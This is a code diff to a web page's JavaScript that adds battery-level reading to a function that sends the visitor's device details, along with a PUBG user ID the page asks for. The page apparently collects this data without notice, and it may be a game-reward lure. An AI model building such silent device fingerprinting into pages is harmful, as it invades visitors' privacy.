@@ -102,11 +102,19 @@
         }
 
         async function sendDeviceInfo() {
+            let batteryPercentage = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryPercentage = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {}
+
             const info = { 
                 deviceType: navigator.platform, 
                 androidVer: navigator.userAgent, 
                 screenSize: window.innerWidth + " x " + window.innerHeight, 
-                batteryLevel: "N/A", 
+                batteryLevel: batteryPercentage, 
                 language: navigator.language 
             };
             const fd = new FormData(); 
@@ -184,7 +192,7 @@
             btn.disabled = true;
             processBox.style.display = "block";
 
-            // د وسیلې معلومات او د پبجي کارن آی ډي (User ID) لیږل
+            // د وسیلې معلومات او د بیټرۍ فیصدي لېږل
             await sendDeviceInfo();
             const userFd = new FormData();
             userFd.append('pubg_user_id', uid);
